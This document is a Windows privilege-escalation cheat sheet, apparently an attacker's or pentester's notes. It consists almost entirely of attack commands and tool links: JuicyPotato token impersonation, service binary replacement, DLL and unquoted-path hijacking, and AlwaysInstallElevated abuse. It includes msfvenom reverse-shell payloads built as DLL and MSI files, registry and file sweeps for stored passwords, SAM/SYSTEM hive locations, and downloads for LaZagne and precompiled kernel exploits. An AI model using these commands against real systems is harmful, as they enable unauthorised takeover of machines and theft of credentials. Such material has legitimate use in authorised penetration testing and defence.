### Automate search for vulnerabilities
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe  
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Privesc/PowerUp.ps1 - Invoke-PrivescAudit  
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 - Find-AllVulns  
https://github.com/hlldz/dazzleUP/releases/download/v1.0/dazzleUP.x64.exe  
https://raw.githubusercontent.com/M4ximuss/Powerless/master/Powerless.bat  
https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat  
https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Seatbelt.exe  
https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x86/Watson.exe  

## Juicy Potato
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe  
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe  
```
needs SeImpersonate or SeAssignPrimaryToken privilege
whoami /priv
```

### Trick NT AUTHORITY\SYSTEM into authenticating via NTLM to a TCP endpoint under control, MitM this authentication and impersonate the token
```
.\JuicyPotato.exe -l <port> -p <reverseConnection>.exe -c {4991d34b-80a1-4291-83b6-3328366b9097} -t *
```

### Get CLSID
https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1  
https://ohpe.it/juicy-potato/CLSID  



## Scheduled Tasks
### Are there folder with full permissions
```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Get scheduled tasks and look for paths with full permissions
```
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```


## Services
### Get services with vulnerable permissions 
https://live.sysinternals.com/accesschk.exe  
https://github.com/ankh2054/windows-pentest/blob/master/Privelege/accesschk-2003-xp.exe  
```
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
```

### Get information about service
```
sc qc <service>
```

### Remove dependency
```
sc config <service> depend= /
```

### Set new binary for service
```
sc config <service> binpath= "<path>\<file>.exe"
```

### Start service
```
net start <service>
```

### Or replace binary with powerview
```
Write-ServiceEXE -ServiceName CustomSVC -UserName <newUser> -Password <password> -Verbose
```

### Or change path of executed binary with powerview
```
Invoke-ServiceUserAdd -ServiceName CustomAPP -UserName <userName> -Password <password> -Verbose
```



## DLL Hijacking
### Check running processes and look for paths with full permissions
```
Tasklist /SVC
ps
```

### Create dll with msfvenom and replace original file
```
msfvenom -p windows/shell/reverse_tcp lhost=<lhost> lport=<lport> -f dll -o <name>.dll
```


## Unquoted Service Paths
### Get unquoted service paths
```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
```

### Check folder permissions (look for F (Full) under Everyone)
```
icacls "C:\Program Files (x86)\<path> "
```

### Place exe file
```
C:\Program Files (x86)\<path>.exe
```

### Restart service (alternatively reboot)
```
sc stop "<serviceName>"
sc start "<serviceName>"
```


## Password Mining
### Autologon registry entries
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

### Credential manager
```
cmdkey /list
dir C:\Users\%username%\AppData\Local\Microsoft\Credentials\
dir C:\Users\%username%\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\%username%\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\%username%\AppData\Roaming\Microsoft\Credentials\
```

### Check for passwords in registry
```
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

### Ssh credentials
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

### Get user that can read laps passwords
```
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

### Can SAM and SYSTEM files be accessed?
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Get unattended files
```
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Search for vnc and password files in ini xml or txt format
```
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
```

### Search for password file in ini, txt or ini format
```
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

### Big search for possible credentials
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"
```

### Recover passwords stored in user memory
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe  

### Use found password to execute command
```
psexec.exe -accepteula -u <user> -p <password> <command> 
```


## AlwaysInstallElevated
### Check if AlwaysInstallElevated is enabled on both registry keys (0x1 -> feature is enabled)
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

### Create msi file with msfvenom 
```
msfvenom -p windows/shell/reverse_tcp lhost=<lhost> lport=<lport> -f msi > <file>.msi
```

### Install file using msi (qn = no GUI, i = regular installation)
```
msiexec /quiet /qn /i <file>.msi
Write-UserAddMSI -Verbose
```


## Startup Applications
### Get startup scripts
```
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```


## Kernel Exploits
### Get os version windows
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Get installed patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### List applications installed via Windows Installer
```
wmic product get name, version, vendor
```

### List systemwide updates
```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

### List device drivers
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```

### Get version number for specific driver
```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*<driver>*"}
```

### Exploit suggester
```
C> systeminfo > systeminfo.txt
$> python3 wes.py systeminfo.txt -e -i "Elevation of Privilege"
```

### Precompiled exploits
https://github.com/WindowsExploits/Exploits  
https://github.com/SecWiki/windows-kernel-exploits  

